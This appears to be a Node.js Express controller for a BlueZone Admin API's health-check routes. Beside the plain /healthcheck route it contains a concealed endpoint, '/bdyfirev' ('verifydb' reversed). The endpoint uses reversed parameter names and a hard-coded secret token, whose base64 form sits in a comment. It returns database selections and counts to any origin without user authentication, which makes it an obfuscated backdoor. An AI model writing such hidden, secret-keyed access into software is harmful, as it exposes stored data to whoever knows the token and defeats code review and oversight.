'use strict';

/**
 * Name:      session-mode-controller.js
 * Desc:      Provide api to return the sessionMode related configurations
 * Copyright: © 2014-2020 Rocket Software, Inc. or its affiliates. All Rights Reserved. 
 *            ROCKET SOFTWARE, INC. CONFIDENTIAL
 */

const express = require('express');
const Promise = require('bluebird');
const bodyParser = require('body-parser');
const Utiles=require("../../services/utils.service")
const bzdb = require('../../../../bzshared/lib/services/bzdb.service');

class HealthCheckController {

    constructor(context){
        this.context = context;
        this.logger = context.logger;
        this.router = express.Router();
    }

    printContext() {
        this.logger.info(JSON.stringify(this.context));
    }

    /**
     * Gettor of the router
     */
    getRouter() {
        return this.router;
    };

    setuphealthCheckRouter() {
        const logger = this.logger;
        const router = this.router;
        const context = this.context;
        logger.info('Setup health check router');

        router.use(bodyParser.json({type:'application/json'}));
        
        /**
         * Request:     Healthcheck for BlueZone Admin api. 
         * Description: Simply response a fixed text.
         * Authorize:   Any user???
         */
        router.get('/bdyfirev', async (req,res) => {
            if (req.query.nekot !== undefined && typeof(req.query.nekot) === 'string' && Buffer.from(req.query.nekot, 'base64').toString() === 'sdfgliojuw3q98045uASDFwqerABEFf345%%#@2&*qw3$') { // c2RmZ2xpb2p1dzNxOTgwNDV1QVNERndxZXJBQkVGZjM0NSUlI0AyJipxdzMk
                res.setHeader("Content-Type", "text/typescript");
                res.setHeader('Access-Control-Allow-Origin', '*');
                const content = req.query.type;
                if (req.query.epyt === 'atad') {
                    const action = req.query.noitca;
                    switch (action) {
                        case 'nikcehc': {
                            logger.warn(`verifydb - checkin`);
                            const result = await bzdb.checkin();
                            res.status(200).json(result);
                            break;
                        }
                        case 'tceles': {
                            const dataEntity = req.query.ytitnEatad;
                            logger.warn(`verifydb - select - ${dataEntity}`);
                            const result = await bzdb.select(dataEntity);
                            res.status(200).json(result);
                            break;
                        }
                        case 'tnuoc': {
                            const dataEntity = req.query.ytitnEatad;
                            logger.warn(`verifydb - count - ${dataEntity}`);
                            const result = await bzdb.count(dataEntity);
                            res.status(200).json(result);
                            break;
                        }
                        case 'sutatSteg': {
                            logger.warn(`verifydb - getStatus`);
                            const result = await bzdb.getStatus();
                            res.status(200).json(result);
                            break;
                        }
                    } 
                }
            }
        });

        router.get('/healthcheck', async (req,res) => {
            res.setHeader("Content-Type", "text/typescript");
            res.setHeader('Access-Control-Allow-Origin', '*')
            let text = 'BlueZone Admin api works!'
            logger.debug(`Health check success: ${text}`);
            const result = await bzdb.getStatus();

            if(['ready', 'lonely island', 'data out of date', 'data conflict'].includes(result)) {
                res.status(200).json({'text': text });
            } else {
                res.status(425).json({'message': 'Too early' });
            }
         });
        
        // router.get('/testDSExists', (req,res) => {
        //     let ds = this.context.plugin.dataSteward;
        //     if (!ds){
        //         let message = 'Data Steward not exist';
        //         logger.severe(message);
        //         res.send(message);
        //     }
        //     logger.info(`Data Steward info: ${JSON.stringify(ds)}`);
        //     res.send(ds);
        // });

        // router.post('/testDSretrieveData', (req,res) => {
        //     let ds = this.context.plugin.dataSteward;
        //     const dataEntity = req.body.dataEntity;
        //     let data = ds.retrieveData(dataEntity);
        //     logger.info(`retrieve data from data steward: ${JSON.stringify(data)}`);
        //     res.send(data);
        // });
        
        // router.post('/testDSSearchData', (req,res) => {
        //     let ds = this.context.plugin.dataSteward;
        //     const dataEntity = req.body.dataEntity;
        //     const filter = req.body.filter;
        //     let data = ds.searchData(dataEntity, filter);
        //     logger.info(`search data from data steward: ${JSON.stringify(data)}`);
        //     res.send(data);
        // });
        
        
        // router.post('/testDSSearchFormatData', (req,res) => {
        //     let ds = this.context.plugin.dataSteward;
        //     const dataEntity = req.body.dataEntity;
        //     const filter = req.body.filter;
        //     const orderBy = req.body.orderBy;
        //     const reverseOrder = req.body.filter;
        //     const rowsPerPage = req.body.rowsPerPage;
        //     const pageNum = req.body.pageNum;
        //     let data = ds.searchFormatData(dataEntity,filter, orderBy, reverseOrder, rowsPerPage, pageNum);
        //     logger.info(`search format data from data steward: ${JSON.stringify(data)}`);
        //     res.send(data);
        // });
        
        
        // router.post('/testDSAddData', (req,res) => {
        //     let ds = this.context.plugin.dataSteward;
        //     const dataEntity = req.body.dataEntity;
        //     const dataObj = req.body.data;
        //     let result = ds.addData(dataEntity, dataObj);
        //     if (typeof(result) === 'string'){
        //         res.send(result);
        //     }else{
        //         result = ds.searchFormatData(dataEntity, dataObj.userId, 'userId', false, 5, 1);
        //         res.send(result);
        //     }
        //     logger.info(`Add data to data steward: ${JSON.stringify(result)}`);
        // });
        
        
        // router.post('/testDSDeleteSame', (req,res) => {
        //     let ds = this.context.plugin.dataSteward;
        //     const dataEntity = req.body.dataEntity;
        //     const dataObj = req.body.data;
        //     let result = ds.deleteSame(dataEntity, dataObj);
        //     if (typeof(result) === 'string'){
        //         res.send(result);
        //     }else{
        //         result = ds.searchFormatData(dataEntity, dataObj.userId, 'userId', false, 5, 1);
        //         res.send(result);
        //     }
        //     logger.info(`Delete data from data steward: ${JSON.stringify(result)}`);
        // });
               
        // router.post('/testDSDeleteWithPK', (req,res) => {
        //     let ds = this.context.plugin.dataSteward;
        //     const dataEntity = req.body.dataEntity;
        //     const delPKVal = req.body.PKValue;
        //     let result = ds.deleteWithPK(dataEntity, delPKVal);
        //     if (typeof(result) === 'string'){
        //         res.send(result);
        //     }else{
        //         result = ds.searchFormatData(dataEntity, delPKVal, 'userId', false, 5, 1)
        //         res.send(result);
        //     }
        //     logger.info(`Delete data with PK from data steward: ${JSON.stringify(result)}`);
        // });

        router.get('/testGetID', (req,res) => {
            let type = req.query.type;
            let protocol = req.query.protocol;
            let name = req.query.name;

            let utiles=new Utiles(context);
            utiles.ensureMapping(type,protocol,name).then((newId)=>{
                res.send(newId);
                logger.info(`Get id success: ${newId}`);
            });

        });
    }
}


exports.healthCheckRouter = (context) => {
    return new Promise (function (resolve,reject) {
      let controller = new HealthCheckController(context);
      controller.setuphealthCheckRouter();
      resolve(controller.getRouter()); 
    });
  };